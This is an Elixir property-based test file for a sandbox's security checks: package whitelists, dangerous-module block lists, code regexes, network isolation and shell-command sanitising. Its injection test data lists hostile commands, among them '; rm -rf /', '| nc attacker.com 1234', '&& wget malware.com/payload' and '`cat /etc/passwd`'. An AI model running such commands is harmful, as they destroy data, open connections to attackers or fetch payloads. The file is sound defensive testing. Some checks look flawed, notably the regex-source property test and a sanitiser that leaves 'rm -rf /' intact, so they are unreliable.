defmodule VsmMcp.Integration.SecurityTest do
  @moduledoc """
  Property-based tests for security validations and package whitelisting.
  
  Tests:
  - Package whitelist enforcement
  - Dangerous package detection
  - Capability restriction
  - Network isolation
  - Command injection prevention
  """
  
  use ExUnit.Case, async: true
  use ExUnitProperties
  
  # Define security constraints
  @whitelisted_packages [
    "express", "fastify", "hapi",              # Web frameworks
    "axios", "node-fetch", "got",              # HTTP clients
    "lodash", "ramda", "underscore",           # Utilities
    "winston", "bunyan", "pino",               # Logging
    "jest", "mocha", "chai",                   # Testing
    "typescript", "babel", "webpack",          # Build tools
    "@anthropic/sdk"                           # Official SDKs
  ]
  
  @dangerous_packages [
    "child_process", "cluster", "dgram",
    "dns", "net", "tls", "crypto",
    "fs", "path", "os", "process",
    "eval", "vm", "domain"
  ]
  
  @dangerous_patterns [
    ~r/eval\s*\(/,
    ~r/Function\s*\(/,
    ~r/require\s*\(\s*["']child_process["']\s*\)/,
    ~r/process\s*\.\s*exit/,
    ~r/process\s*\.\s*kill/,
    ~r/__dirname\.\.\/\.\./,
    ~r/fs\s*\.\s*rm/,
    ~r/rimraf/
  ]
  
  describe "package whitelist validation" do
    property "accepts all whitelisted packages" do
      check all package <- member_of(@whitelisted_packages) do
        assert validate_package(package) == :ok
      end
    end
    
    property "rejects non-whitelisted packages" do
      check all package <- string(:alphanumeric, min_length: 3),
                package not in @whitelisted_packages do
        case validate_package(package) do
          :ok -> package in @whitelisted_packages
          {:error, :not_whitelisted} -> true
        end
      end
    end
    
    property "detects dangerous built-in modules" do
      check all package <- member_of(@dangerous_packages) do
        assert {:error, :dangerous_package} = validate_package(package)
      end
    end
  end
  
  describe "code pattern security" do
    property "detects dangerous code patterns" do
      check all pattern <- member_of(@dangerous_patterns),
                padding <- string(:alphanumeric),
                code = padding <> Regex.source(pattern) <> padding do
        
        assert {:error, :dangerous_code} = validate_code(code)
      end
    end
    
    property "allows safe code patterns" do
      safe_patterns = [
        "console.log('hello')",
        "const result = await fetch(url)",
        "function add(a, b) { return a + b }",
        "class MyClass extends BaseClass {}"
      ]
      
      check all code <- member_of(safe_patterns) do
        assert :ok = validate_code(code)
      end
    end
  end
  
  describe "capability restrictions" do
    test "enforces capability boundaries" do
      test_cases = [
        # Capability -> Allowed operations
        {"file operations", ["read", "write", "list"], ["execute", "delete_system"]},
        {"web search", ["search", "fetch"], ["post", "delete"]},
        {"database", ["query", "insert"], ["drop_database", "create_user"]},
        {"compute", ["calculate", "transform"], ["spawn_process", "allocate_memory"]}
      ]
      
      for {capability, allowed, forbidden} <- test_cases do
        for op <- allowed do
          assert :ok = validate_operation(capability, op)
        end
        
        for op <- forbidden do
          assert {:error, _} = validate_operation(capability, op)
        end
      end
    end
    
    property "capability operations are properly scoped" do
      capabilities = ["file operations", "web search", "database", "compute"]
      
      check all capability <- member_of(capabilities),
                operation <- string(:alphanumeric, min_length: 3) do
        
        result = validate_operation(capability, operation)
        
        case result do
          :ok -> operation in get_allowed_operations(capability)
          {:error, :forbidden_operation} -> true
        end
      end
    end
  end
  
  describe "network isolation" do
    test "blocks external network access by default" do
      blocked_hosts = [
        "8.8.8.8",                    # External DNS
        "1.1.1.1",                    # Cloudflare DNS
        "google.com",                 # External site
        "githubusercontent.com",       # Code hosting
        "registry.npmjs.org"          # Package registry
      ]
      
      for host <- blocked_hosts do
        assert {:error, :network_blocked} = validate_network_access(host)
      end
    end
    
    test "allows whitelisted internal services" do
      allowed_hosts = [
        "localhost",
        "127.0.0.1",
        "mcp-server.local",
        "internal-api.vsm"
      ]
      
      for host <- allowed_hosts do
        assert :ok = validate_network_access(host)
      end
    end
    
    property "network validation handles various host formats" do
      check all host <- one_of([
                  # IP addresses
                  tuple({integer(0..255), integer(0..255), integer(0..255), integer(0..255)})
                  |> map(&Tuple.to_list/1)
                  |> map(&Enum.join(&1, ".")),
                  # Domain names
                  string(:alphanumeric, min_length: 3) |> map(&"#{&1}.com"),
                  # Localhost variants
                  member_of(["localhost", "127.0.0.1", "::1"])
                ]) do
        
        result = validate_network_access(host)
        assert result in [:ok, {:error, :network_blocked}]
      end
    end
  end
  
  describe "command injection prevention" do
    property "sanitizes shell commands" do
      dangerous_inputs = [
        "; rm -rf /",
        "| nc attacker.com 1234",
        "&& wget malware.com/payload",
        "$(evil_command)",
        "`cat /etc/passwd`",
        "; shutdown -h now"
      ]
      
      check all input <- member_of(dangerous_inputs) do
        sanitized = sanitize_command(input)
        
        # Should escape or remove dangerous characters
        refute String.contains?(sanitized, ";")
        refute String.contains?(sanitized, "|")
        refute String.contains?(sanitized, "&")
        refute String.contains?(sanitized, "$")
        refute String.contains?(sanitized, "`")
      end
    end
    
    test "allows safe command arguments" do
      safe_inputs = [
        "hello world",
        "file-name.txt",
        "/path/to/file",
        "key=value",
        "123456"
      ]
      
      for input <- safe_inputs do
        assert sanitize_command(input) == input
      end
    end
  end
  
  describe "resource limits" do
    property "enforces memory limits" do
      check all memory_mb <- integer(1..2048) do
        limit = 512  # MB
        
        result = validate_memory_usage(memory_mb)
        
        if memory_mb <= limit do
          assert result == :ok
        else
          assert {:error, :memory_limit_exceeded} = result
        end
      end
    end
    
    property "enforces CPU usage limits" do
      check all cpu_percent <- integer(0..100) do
        limit = 50  # percent
        
        result = validate_cpu_usage(cpu_percent)
        
        if cpu_percent <= limit do
          assert result == :ok
        else
          assert {:error, :cpu_limit_exceeded} = result
        end
      end
    end
  end
  
  # Security validation functions
  
  defp validate_package(package) do
    cond do
      package in @dangerous_packages -> {:error, :dangerous_package}
      package in @whitelisted_packages -> :ok
      true -> {:error, :not_whitelisted}
    end
  end
  
  defp validate_code(code) do
    if Enum.any?(@dangerous_patterns, &Regex.match?(&1, code)) do
      {:error, :dangerous_code}
    else
      :ok
    end
  end
  
  defp validate_operation(capability, operation) do
    allowed = get_allowed_operations(capability)
    
    if operation in allowed do
      :ok
    else
      {:error, :forbidden_operation}
    end
  end
  
  defp get_allowed_operations(capability) do
    case capability do
      "file operations" -> ["read", "write", "list", "stat"]
      "web search" -> ["search", "fetch", "query"]
      "database" -> ["query", "insert", "update", "select"]
      "compute" -> ["calculate", "transform", "analyze"]
      _ -> []
    end
  end
  
  defp validate_network_access(host) do
    whitelisted = ["localhost", "127.0.0.1", "::1"] ++ 
                  Enum.filter(["mcp-server.local", "internal-api.vsm"], &String.ends_with?(host, &1))
    
    if host in whitelisted or String.ends_with?(host, ".local") do
      :ok
    else
      {:error, :network_blocked}
    end
  end
  
  defp sanitize_command(input) do
    input
    |> String.replace(~r/[;&|$`]/, "")
    |> String.replace(~r/\s+/, " ")
    |> String.trim()
  end
  
  defp validate_memory_usage(memory_mb) do
    if memory_mb <= 512 do
      :ok
    else
      {:error, :memory_limit_exceeded}
    end
  end
  
  defp validate_cpu_usage(cpu_percent) do
    if cpu_percent <= 50 do
      :ok
    else
      {:error, :cpu_limit_exceeded}
    end
  end
end